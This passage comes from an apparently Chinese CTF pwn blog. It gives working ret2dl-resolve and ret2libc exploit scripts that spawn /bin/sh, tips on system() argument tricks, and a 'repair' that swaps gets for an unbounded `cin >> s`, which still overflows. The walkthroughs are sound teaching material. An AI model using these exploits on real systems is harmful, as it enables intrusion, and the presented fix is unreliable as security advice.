class="number">0x12</span>])</span><br></pre></td></tr></table></figure><ul><li>构造dynsym表里的结构体，如果你不记得他具体结构是什么，往上翻一下，我们需要伪造的只有第一项跟第四项，其余为0，第一项为st_name，也就是符号的具体偏移位置，第四项标识为导入函数</li><li>这里我将fake_sym_addr + 0x10作为’system\x00’的地址，然后求出相对偏移，然后将他构造成一个结构体</li></ul><h4 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br></pre></td></tr></table></figure><p>这部分是最后的了，这个偏移就是拿来寻找.rel.plt表的<br>构造完后，我们需要构造ROP链了</p><h3 id="ROP链的构造"><a href="#ROP链的构造" class="headerlink" title="ROP链的构造"></a>ROP链的构造</h3><p>说实话，我好几次看这个ROP链，我都被绕晕了，搞了好几次才完全理解，忘了结构体的原因，建议不要跟博主一样这样命名，结构体最后加个fake_sys_struct这样的，方便看</p><h4 id="第一部分-1"><a href="#第一部分-1" class="headerlink" title="第一部分"></a>第一部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">sh = <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure><ul><li>初始化ROP链和参数<h4 id="第二部分-1"><a href="#第二部分-1" class="headerlink" title="第二部分"></a>第二部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br></pre></td></tr></table></figure></li><li>先plt0，我已经说过了，调用那部分地址，才能利用_dl_runtime_resolve</li><li>然后传入偏移,32位是用栈传参的，也就是这样</li><li>如果是64位，这里还得调整下，先利用pop将参数弄到寄存器里，在调用plt0</li></ul><h4 id="第三部分-1"><a href="#第三部分-1" class="headerlink" title="第三部分"></a>第三部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(base_stage+<span class="number">82</span>)</span><br></pre></td></tr></table></figure><ul><li>bbbb为返回地址</li><li>base-stage + 82 为函数参数，这个函数是我们最后将程序控制权交给他的函数，本题里也就是system函数<br>这里具体为什么是这里，你可以从gdb调试看出来，他里面<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble _dl_runtime_resolve</span><br><span class="line">Dump of assembler code for function _dl_runtime_resolve:</span><br><span class="line">=&gt; 0xf7f7e6c0 &lt;+0&gt;:	push   eax</span><br><span class="line">   0xf7f7e6c1 &lt;+1&gt;:	push   ecx</span><br><span class="line">   0xf7f7e6c2 &lt;+2&gt;:	push   edx</span><br><span class="line">   0xf7f7e6c3 &lt;+3&gt;:	mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7f7e6c7 &lt;+7&gt;:	mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">   0xf7f7e6cb &lt;+11&gt;:	call   0xf7f78ac0 &lt;_dl_fixup&gt;</span><br><span class="line">   0xf7f7e6d0 &lt;+16&gt;:	pop    edx</span><br><span class="line">   0xf7f7e6d1 &lt;+17&gt;:	mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7f7e6d4 &lt;+20&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7f7e6d7 &lt;+23&gt;:	mov    eax,DWORD PTR [esp+0x4]</span><br><span class="line">   0xf7f7e6db &lt;+27&gt;:	ret    0xc</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wcup4ilbj30yw0md7d6.jpg" alt="4"></li><li>从上图可以看出，他直接将栈迁移到了system函数那里，看到这里不由得佩服前人们，研究出了这些攻击方法，然后后面又提高了栈， ret 0xc平衡堆栈过后就刚好对应上了<br>看参数<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2wcuukgx1j30xq0p8ti8.jpg" alt="5"></li><li>这里arg[0]就是返回地址，</li><li>arg[1]就是参数了</li><li>符合了原来的说法，调用完dl_runtime_resolve后将程序控制权交给解析出来的函数。。我先把后面的过程讲了，我在绕回来讲表吧</li></ul><h4 id="第四部分-1"><a href="#第四部分-1" class="headerlink" title="第四部分"></a>第四部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br></pre></td></tr></table></figure><ul><li>进行填充，使位置达到base_stage + 24</li></ul><h4 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(fake_sys_rel)</span><br></pre></td></tr></table></figure><ul><li>填入.rel.plt里的一个结构体，用于解析函数</li></ul><h4 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(align * <span class="string">'a'</span>)</span><br></pre></td></tr></table></figure><ul><li>填充对齐部分<h4 id="第七部分"><a href="#第七部分" class="headerlink" title="第七部分"></a>第七部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(fake_sys)</span><br></pre></td></tr></table></figure></li><li>这里填入的是一个结构体，大小为0x10，fake_sys-&gt;st_name后去找我们的dynstr，这里st_name构造的就是这里地址在加0x10，所以这个结构体过后就是system字符串地址了</li></ul><h4 id="第八部分"><a href="#第八部分" class="headerlink" title="第八部分"></a>第八部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'system\x00'</span>)</span><br></pre></td></tr></table></figure><h4 id="第九部分"><a href="#第九部分" class="headerlink" title="第九部分"></a>第九部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">80</span> - len(rop.chain())))</span><br><span class="line"><span class="keyword">print</span> len(rop.chain())</span><br></pre></td></tr></table></figure><ul><li>这里打印出来是82,rop链的自动对齐，所以接下来是参数内容/bin/sh<h4 id="第十部分"><a href="#第十部分" class="headerlink" title="第十部分"></a>第十部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop.raw(sh+<span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><p>完整构造就这样完成了，接下来直接打就能成功了。<br>先贴上完整exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">io = process(<span class="string">'./pwn'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">rop.raw(<span class="string">'a'</span>*offset)</span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./pwn'</span>)</span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym)/<span class="number">0x10</span></span><br><span class="line">st_name = fake_sym_addr + <span class="number">0x10</span> - dynstr</span><br><span class="line">fake_sys = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt</span><br><span class="line">read_got = elf.got[<span class="string">'setvbuf'</span>]</span><br><span class="line">r_info = index_dynsym &lt;&lt; <span class="number">8</span> | <span class="number">0x7</span></span><br><span class="line">fake_sys_rel = flat([read_got, r_info])</span><br><span class="line">sh = <span class="string">'/bin/sh'</span></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(base_stage+<span class="number">82</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line">rop.raw(<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">rop.raw(fake_sys_rel)</span><br><span class="line">rop.raw(align * <span class="string">'a'</span>)</span><br><span class="line">rop.raw(fake_sys)</span><br><span class="line">rop.raw(<span class="string">'system\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">80</span> - len(rop.chain())))</span><br><span class="line"><span class="keyword">print</span> len(rop.chain())</span><br><span class="line">rop.raw(sh+<span class="string">'\x00'</span>)</span><br><span class="line">rop.raw(<span class="string">'a'</span>*(<span class="number">100</span> - len(rop.chain())))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>终于写完了这道题。。。不过好像跟我标题好像不太符合啊，通杀，如何通杀。。。</p><h2 id="通杀"><a href="#通杀" class="headerlink" title="通杀"></a>通杀</h2><ul><li>其实这种类型题中间的构造部分完全可以不理，也就是rop链构造和表得到构造部分，你可以直接复制黏贴中间部分拿去打别的题目，也是能成功的，我测试了xctf2015的那道题，也就是ctf-wiki例题，以及iscc2019的题目都是一个套路</li><li>其实还有集成工具利用，叫roputils,这个也是一个库，专门用于对付ret2dllruntime</li><li>理解过后，这种题你会发觉很简单，因为利用方式单一，根本没有啥骚姿势学习了，都是一样的套路了</li></ul><p><strong>接下来贴下roputils的利用方法，我根本没改什么，就是ctf-wiki的工具使用方法，改几个参数就行，我将需要改的参数提放到前面了</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">'pwn'</span></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./'</span> + processName)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">rop = ROP(<span class="string">'./'</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">'read'</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>是不是发觉精简好多，几乎不用写啥，我感觉这种题就是这样，原理难理解点，解题很简单，以后比赛遇到这种题，就拿这个exp改下offset和程序名，一波梭，有时候需要手动迁移下栈而已</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul><li>以后遇到高级ROP这种题就一把梭了</li><li>妈妈在也不用担心我遇到栈的这种问题了</li><li>我只分析了32位程序的这种题，64位题目的结构和大小也改了，不用利用工具也可以方便的搞定，具体自行尝试了</li></ul><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/a606db69/">https://noone-hub.github.io/posts/a606db69/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn细节</title>
    <url>/posts/aaf99047/</url>
    <content><![CDATA[<ol><li>system(“/bin/sh”)</li><li>system(“sh”)</li><li>system(“/bin/bash”)</li><li>system(“bash”)</li><li>system(“$0”)</li></ol><p>若还不成，可试试在参数后面加;#<br>比如system(“/bin/sh;#”)<br>这是由于函数的特殊性，有些函数会截断特殊字符</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/aaf99047/">https://noone-hub.github.io/posts/aaf99047/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 细节</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛pwn01</title>
    <url>/posts/2bb7fa87/</url>
    <content><![CDATA[<h1 id="pwn-01"><a href="#pwn-01" class="headerlink" title="pwn-01"></a>pwn-01</h1><p>题目不难，很明显能看出ROP</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your Plaintext to be encrypted"</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span> )</span><br><span class="line">          s[x] ^= <span class="number">0xF</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[x] ^= <span class="number">0xE</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      s[x] ^= <span class="number">0xD</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    ++x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ciphertext"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p>gets没有限制长度，然后有个麻烦的地方就是对payload进行了一轮加密操作，然后过了这部分后，还要记住他是64位程序，用寄存器传前5个还是前6个参数来着，忘了，不重要，不过确定的是第一位是用的rdi，所以需要<br>ROPgadget –binary Emachine –only ‘pop|ret’<br>然后找到那个地址</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└──╼ <span class="variable">$ROPgadget</span> --binary Emachine --only <span class="string">'pop|ret'</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c82 : pop r15 ; ret</span><br><span class="line">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007f0 : pop rbp ; ret</span><br><span class="line">0x0000000000400aec : pop rbx ; pop rbp ; ret</span><br><span class="line">0x0000000000400c83 : pop rdi ; ret</span><br><span class="line">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b9 : ret</span><br><span class="line">0x00000000004008ca : ret 0x2017</span><br><span class="line">0x0000000000400962 : ret 0x458b</span><br><span class="line">0x00000000004009c5 : ret 0xbf02</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 15</span><br></pre></td></tr></table></figure><p>然后加密部分在加密一次就完了，异或加密可逆</p><h2 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">        <span class="keyword">if</span> ord(payload[x]) &lt;= <span class="number">96</span> <span class="keyword">or</span> ord(payload[x]) &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> ord(payload[x]) &lt;=<span class="number">64</span> <span class="keyword">or</span> ord(payload[x]) &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> ord(payload[x]) &gt; <span class="number">47</span> <span class="keyword">and</span> ord(payload[x]) &lt;= <span class="number">57</span>:</span><br><span class="line">                    result += chr(ord(payload[x]) ^ <span class="number">0xf</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result += payload[x]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += chr(ord(payload[x]) ^ <span class="number">0xe</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += chr(ord(payload[x]) ^ <span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="初始化部分"><a href="#初始化部分" class="headerlink" title="初始化部分"></a>初始化部分</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset = <span class="number">0x50</span> + <span class="number">8</span></span><br><span class="line"><span class="comment">#io = process("./Emachine")</span></span><br><span class="line">io = remote(<span class="string">"172.29.14.110"</span>, <span class="number">8888</span>)</span><br><span class="line">elf = ELF(<span class="string">'./Emachine'</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">__libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">start = <span class="number">0x0000000000400B28</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">__libc_start_main_plt = elf.plt[<span class="string">'__libc_start_main'</span>]</span><br></pre></td></tr></table></figure><p>初始化部分，offset是0x58，本地是和远程libc不一样</p><h2 id="主函数部分"><a href="#主函数部分" class="headerlink" title="主函数部分"></a>主函数部分</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> hex(puts_plt)</span><br><span class="line">    <span class="keyword">print</span> hex(__libc_start_main_got)</span><br><span class="line">    <span class="keyword">print</span> hex(__libc_start_main_plt)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#encrypt</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    payload = p64(__libc_start_main_got<span class="number">-1</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*offset +  p64(pop_rdi) + p64(__libc_start_main_got<span class="number">-1</span>) + p64(puts_plt) +  p64(<span class="number">0x0000000000400B28</span>) </span><br><span class="line">    payload = Decrypt(payload)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">"Ciphertext\n"</span>)</span><br><span class="line">    <span class="comment">#print "io.recv =" + io.recv()</span></span><br><span class="line">    <span class="comment">#io.sendline("1")</span></span><br><span class="line">    <span class="comment">#result = io.recvuntil("\nE", drop= True)[-8:]</span></span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    result = io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    result = u64(result[:<span class="number">-1</span>]+p8(<span class="number">0</span>)+p8(<span class="number">0</span>))</span><br><span class="line">    <span class="comment">#泄露libc地址</span></span><br><span class="line">    <span class="keyword">print</span> hex(result)</span><br><span class="line"></span><br><span class="line">    __libc_start_main_addr = result</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'a'</span>*offset  + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) </span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    <span class="comment">#print "addr " + hex(u64(io.recv(8)))</span></span><br><span class="line">    <span class="comment">#print hex(u64(io.recv(8)))</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#print len(io.recv(8))</span></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>直接把payload 进行一次加密就完了，然后进行正常的ROP就完了，pop_rdi, 将__libc_start_got pop到rdi里，然后puts就是puts got，然后返回地址就是0x0000000000400B28<br>泄露过后，我这里进行调试了很多遍，才知道如何接受那个字符串，就是泄露的libc_start_main地址</p><p>接受成功后，就是在pop bin_sh 然后执行system函数就完了，</p><p>现在写writeup的时候，发觉有更简单的办法，加密函数根本不用管，我原来错的只是寄存器传参的问题，因为我发觉我后面传payload的时候忘了加密也成了。。。。<br>所以。。。原来是简单题，被我做复杂了。。。<br>只是一个在简单不过的ret2libc??</p><p>还有个内网我无法下载libc。。。幸亏我特么本机存了ctf-wiki的libc，那个题目的libc直接打成了是libc2.23.so<br>好像后面的题目也给了libc，直接下载也成吧<br>以后要正确区分64位程序跟32位程序区别，这次踩了好久的坑</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/2bb7fa87/">https://noone-hub.github.io/posts/2bb7fa87/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>国赛pwn修复1</title>
    <url>/posts/ce5ca923/</url>
    <content><![CDATA[<p>#修复部分</p><p>题目出现的麻烦就是出现了gets危险函数，所以把gets危险函数去除，换成fgets或换成c++的cin即可，甚至可以加个cannary保护，因为题目本身没泄露，所以没法泄露cannary，所以溢出都不行了，cannary保护我也不记得命令，玩蛇皮，不给百度</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1.Encrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2.Decrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3.Exit"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Input your choice!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">48</span>];</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input your Plaintext to be encrypted"</span>);</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">    <span class="keyword">while</span>( <span class="built_in">strlen</span>(s) &gt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span>)</span><br><span class="line">                    s[x] ^= <span class="number">0xf</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                s[x] ^= <span class="number">14</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            s[x] ^= <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++x;</span><br><span class="line">    &#125;</span><br><span class="line">    s[<span class="number">47</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Ciphertext"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> input;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE                            hh      iii                "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to this Encryption machine\n"</span>);</span><br><span class="line">    begin();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            fflush(<span class="number">0</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="keyword">if</span>(input != <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"I think you can do it by yourself"</span>);</span><br><span class="line">            begin();</span><br><span class="line">        &#125;</span><br><span class="line">        <span 